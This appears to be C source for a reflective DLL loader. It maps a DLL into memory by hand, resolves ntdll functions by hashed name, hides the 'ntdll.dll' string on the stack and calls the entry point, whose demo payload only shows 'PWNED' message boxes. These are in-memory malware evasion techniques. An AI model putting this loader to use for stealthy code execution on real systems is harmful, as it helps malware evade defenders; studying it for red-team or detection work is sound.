#include <Windows.h>
#include <stdio.h>

#include "reflective_loader.h"

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(void)
{
    HMODULE                     NtBase = NULL, PeBase = NULL;
    _NtFuncs                    NtFuncs;
    _EntryArgs                  EntryArgs;
    PIMAGE_NT_HEADERS           NtHeaders = NULL;
    PIMAGE_SECTION_HEADER       SecHeaders = NULL;
    SIZE_T                      ImageSz = 0;
    LPVOID                      NewBase = 0;
    PIMAGE_DATA_DIRECTORY       ImageDir = NULL;
    PIMAGE_IMPORT_DESCRIPTOR    ImageDesc = NULL;
    HMODULE                     ModuleBase = NULL, NewModuleBase = NULL;
    UNICODE_STRING              ModuleStr;
    WCHAR                       ModuleName[MAX_PATH];
    PIMAGE_NT_HEADERS           ModuleHeaders = NULL;
    PIMAGE_DATA_DIRECTORY       ModuleDir = NULL;
    PIMAGE_EXPORT_DIRECTORY     ModuleExport = NULL, NewModuleExport = NULL;
    ULONG_PTR                   ModuleAddresses;
    PIMAGE_THUNK_DATA           OriginalFirst = NULL, FirstThunk = NULL;
    UINT64                      RelocDelta = 0;
    PIMAGE_DATA_DIRECTORY       RelocDir = NULL;
    PIMAGE_BASE_RELOCATION      RelocBlock = NULL;
    PIMAGE_RELOC                RelocEntry = NULL;
    ULONG_PTR                   RelocBase = 0;
    ULONG_PTR                   ProtBase = 0;
    SIZE_T                      ProtSize = 0;
    ULONG                       OldProt = 0, NewProt = 0;
    SIZE_T                      FreeSize = 0;
    DWORD                       i = 0;
    /*
        * Doing this way so our string lands on stack.
    */
    wchar_t                     ntd[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };

    /*
        Manual memset so the compiler doesn't insert its own memset
    */
    _memset(&NtFuncs, 0, sizeof(_NtFuncs));
    _memset(&EntryArgs, 0, sizeof(_EntryArgs));
    _memset(&ModuleStr, 0, sizeof(UNICODE_STRING));
    _memset(&ModuleName, 0, sizeof(ModuleName));

    /*
        * Locate the base address of our PE.
    */
    PeBase = _GetBase();

    /*
        * Resolve native functions we need.
    */
    NtBase = _GetModuleHandle(ntd);

    NtFuncs.LdrLoadDll = _GetProcAddress(NtBase, LDRLOADDLL_HASH);
    NtFuncs.NtAllocateVirtualMemory = _GetProcAddress(NtBase, NTALLOCATEVIRTUALMEMORY_HASH);
    NtFuncs.NtProtectVirtualMemory = _GetProcAddress(NtBase, NTPROTECTVIRTUALMEMORY_HASH);
    EntryArgs.NtFreeVirtualMemory = _GetProcAddress(NtBase, NTFREEVIRTUALMEMORY_HASH);

    /*
        * Allocate memory and map sections based on their protections
    */
    NtHeaders = (PIMAGE_NT_HEADERS)((UINT64)PeBase + (UINT64)(((PIMAGE_DOS_HEADER)PeBase)->e_lfanew));

    ImageSz = NtHeaders->OptionalHeader.SizeOfImage;

    NtFuncs.NtAllocateVirtualMemory(NtCurrentProcess(), &NewBase, NULL, &ImageSz, MEM_COMMIT, PAGE_READWRITE);

    SecHeaders = IMAGE_FIRST_SECTION(NtHeaders);
    for (; i < NtHeaders->FileHeader.NumberOfSections; i++)
        _memcpy(
            (UINT64)NewBase + SecHeaders[i].VirtualAddress,
            (UINT64)PeBase + SecHeaders[i].PointerToRawData,
            SecHeaders[i].SizeOfRawData
        );

    /*
        * Patch import table
    */
    ImageDir = (PIMAGE_DATA_DIRECTORY)(&(NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]));
    ImageDesc = (PIMAGE_IMPORT_DESCRIPTOR)((UINT64)NewBase + (UINT64)(ImageDir->VirtualAddress));

    for (; ImageDesc->Name; ImageDesc++) {
        _memset(ModuleName, 0, sizeof(ModuleName));

        CharStringToWCharString(ModuleName, (UINT64)NewBase + ImageDesc->Name, MAX_PATH);
        ModuleStr.Buffer = ModuleName;
        ModuleStr.Length = StringLengthW(ModuleName) * sizeof(WCHAR);
        ModuleStr.MaximumLength = ModuleStr.Length;
        NtFuncs.LdrLoadDll(NULL, 0, &ModuleStr, &ModuleBase);

        ModuleHeaders = (PIMAGE_NT_HEADERS)((UINT64)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
        ModuleDir = (PIMAGE_DATA_DIRECTORY) & (ModuleHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
        ModuleExport = (PIMAGE_EXPORT_DIRECTORY)((UINT64)ModuleBase + ModuleDir->VirtualAddress);
        NewModuleExport = ModuleExport;

        OriginalFirst = (PIMAGE_THUNK_DATA)((UINT64)NewBase + ImageDesc->OriginalFirstThunk);
        FirstThunk = (PIMAGE_THUNK_DATA)((UINT64)NewBase + ImageDesc->FirstThunk);

        for (; OriginalFirst->u1.AddressOfData; OriginalFirst++, FirstThunk++) {
            if ((OriginalFirst->u1.Ordinal) & IMAGE_ORDINAL_FLAG) {

                /*
                    * Import by ordinal
                */
                ModuleAddresses = (UINT64)ModuleBase + ModuleExport->AddressOfFunctions;
                ModuleAddresses += ((IMAGE_ORDINAL((OriginalFirst->u1.Ordinal)) - ModuleExport->Base) * sizeof(DWORD));
                ModuleAddresses = (UINT64)ModuleBase + *(UINT64 *)ModuleAddresses;
            }
            else

                /*
                    * Import by name
                */
                ModuleAddresses = _GetProcAddress(ModuleBase, _GetHash(((PIMAGE_IMPORT_BY_NAME)((UINT64)NewBase + OriginalFirst->u1.AddressOfData))->Name));

            /*
                * Check if function is forwarded
            */
            while (ModuleAddresses > NewModuleExport && ModuleAddresses < (NewModuleExport + ModuleDir->Size)) {

                /*
                    * Address falls into export directory
                    * It's a forwarded function with syntax MODULENAME.FUNCTIONNAME
                */
                _memset(ModuleName, 0, sizeof(ModuleName));
                for (i = 0; ((char *)(ModuleAddresses))[i] != '.'; i++)
                    ModuleName[i] = ((char *)(ModuleAddresses))[i];

                ModuleStr.Buffer = ModuleName;
                ModuleStr.Length = StringLengthW(ModuleName) * sizeof(WCHAR);
                ModuleStr.MaximumLength = ModuleStr.Length;
                NtFuncs.LdrLoadDll(NULL, 0, &ModuleStr, &NewModuleBase);

                ModuleHeaders = (PIMAGE_NT_HEADERS)((UINT64)NewModuleBase + ((PIMAGE_DOS_HEADER)NewModuleBase)->e_lfanew);
                ModuleDir = (PIMAGE_DATA_DIRECTORY) & (ModuleHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
                NewModuleExport = (PIMAGE_EXPORT_DIRECTORY)((UINT64)NewModuleBase + ModuleDir->VirtualAddress);

                ModuleAddresses = _GetProcAddress(NewModuleBase, _GetHash(ModuleAddresses + i + 1));
            }
            *((ULONG_PTR *)(FirstThunk)) = ModuleAddresses;
        }
    }

    /*
        * Patch relocations
    */
    RelocDelta = (UINT64)NewBase - NtHeaders->OptionalHeader.ImageBase;
    RelocDir = (PIMAGE_DATA_DIRECTORY) & (NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
    if (RelocDir->Size) {
        RelocBlock = (UINT64)NewBase + RelocDir->VirtualAddress;
        while (RelocBlock->SizeOfBlock) {
            RelocBase = (UINT64)NewBase + RelocBlock->VirtualAddress;
            i = (RelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
            RelocEntry = (PIMAGE_RELOC)((UINT64)RelocBlock + sizeof(IMAGE_BASE_RELOCATION));
            while (i--) {
                if (RelocEntry->type == IMAGE_REL_BASED_DIR64)
                    *(ULONG_PTR *)(RelocBase + RelocEntry->offset) += RelocDelta;
                else if (RelocEntry->type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD *)(RelocBase + RelocEntry->offset) += (DWORD)RelocDelta;
                else if (RelocEntry->type == IMAGE_REL_BASED_HIGH)
                    *(WORD *)(RelocBase + RelocEntry->offset) += HIWORD(RelocDelta);
                else if (RelocEntry->type == IMAGE_REL_BASED_LOW)
                    *(WORD *)(RelocBase + RelocEntry->offset) += LOWORD(RelocDelta);

                (UINT64)RelocEntry += sizeof(IMAGE_RELOC);
            }
            (UINT64)RelocBlock = (UINT64)RelocBlock + RelocBlock->SizeOfBlock;
        }
    }

    /*
        * Patch permissions
    */
    for (i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
        ProtBase = (UINT64)NewBase + SecHeaders[i].VirtualAddress;
        ProtSize = SecHeaders[i].SizeOfRawData;
        OldProt = 0;
        NewProt = 0;

        if (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            NewProt = PAGE_WRITECOPY;

        if (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_READ)
            NewProt = PAGE_READONLY;

        if ((SecHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_READ))
            NewProt = PAGE_READWRITE;

        if (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            NewProt = PAGE_EXECUTE;

        if ((SecHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            NewProt = PAGE_EXECUTE_WRITECOPY;

        if ((SecHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_READ))
            NewProt = PAGE_EXECUTE_READ;

        if ((SecHeaders[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (SecHeaders[i].Characteristics & IMAGE_SCN_MEM_READ))
            NewProt = PAGE_EXECUTE_READWRITE;

        NtFuncs.NtProtectVirtualMemory(NtCurrentProcess(), &ProtBase, &ProtSize, NewProt, &OldProt);
    }

    /*
        * Set up our struct to be passed to entry point
    */
    EntryArgs.OldBase = &PeBase;

    /*
        * Call entry point
    */
    BOOL(WINAPI * EntryPoint) (PVOID, DWORD, PVOID) = (UINT64)NewBase + NtHeaders->OptionalHeader.AddressOfEntryPoint;
    EntryPoint(NewBase, DLL_PROCESS_ATTACH, (PVOID)1);

    return (ULONG_PTR)NewBase;
}

SIZE_T CharStringToWCharString(PWCHAR Dest, PCHAR Src, SIZE_T MaximumAllowed)
{
    /*
        * Direct copy from https://github.com/Cracked5pider/KaynLdr/blob/main/KaynLdr/src/Win32.c
    */
    SIZE_T Length = MaximumAllowed;

    while (--Length >= 0) {
        if (!(*Dest++ = *Src++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

SIZE_T StringLengthW(LPCWSTR String)
{
    /*
        * Direct copy from https://github.com/Cracked5pider/KaynLdr/blob/main/KaynLdr/src/Win32.c
    */
    LPCWSTR String2;

    for (String2 = String; *String2; String2++);

    return (String2 - String);
}

void *_memcpy(void *dest, const void *src, size_t len)
{
    char *d = dest;
    const char *s = src;
    while (len--)
        *d++ = *s++;
    return dest;
}

void *_memset(void *dest, int val, size_t len)
{
    unsigned char *ptr = dest;
    while (len-- > 0)
        *ptr++ = val;
    return dest;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    SIZE_T sz = 0;
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, "Attached!",NULL, MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case 9999:
        /*
            * Wipe out our initial allocation
        */
        ((_PEntryArgs)lpReserved)->NtFreeVirtualMemory(NtCurrentProcess(), ((_PEntryArgs)lpReserved)->OldBase, &sz, MEM_RELEASE);
        MessageBoxA(NULL, "PWNED", NULL, MB_HELP);
        TerminateThread(NtCurrentThread(), 0);
        break;
    }
    return TRUE;
}